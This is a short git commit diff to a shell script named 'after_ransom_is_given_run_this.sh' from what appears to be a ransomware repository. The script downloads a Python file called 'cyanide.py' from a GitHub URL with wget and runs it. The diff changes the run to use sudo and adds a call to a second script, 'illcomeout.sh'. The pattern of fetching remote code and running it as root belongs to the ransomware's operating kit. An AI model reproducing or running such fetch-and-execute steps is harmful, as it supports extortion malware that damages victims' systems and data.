e5b2daae5a62f9557150e951e77581945c8dde8a
samsepi0lw <147035842+samsepi0lw@users.noreply.github.com>
2023-10-13 05:58:12 +0000

    Update after_ransom_is_given_run_this.sh

--- after_ransom_is_given_run_this.sh
+++ after_ransom_is_given_run_this.sh
@@ -2,4 +2,6 @@ wget https://github.com/samsepi0lw/ransom/blob/main/cyanide.py?raw=true
 mv cyanide.py\?raw=true cyanide.py
 clear
 #!/bin/bash
-python cyanide.py
+sudo python cyanide.py
+clear
+bash illcomeout.sh
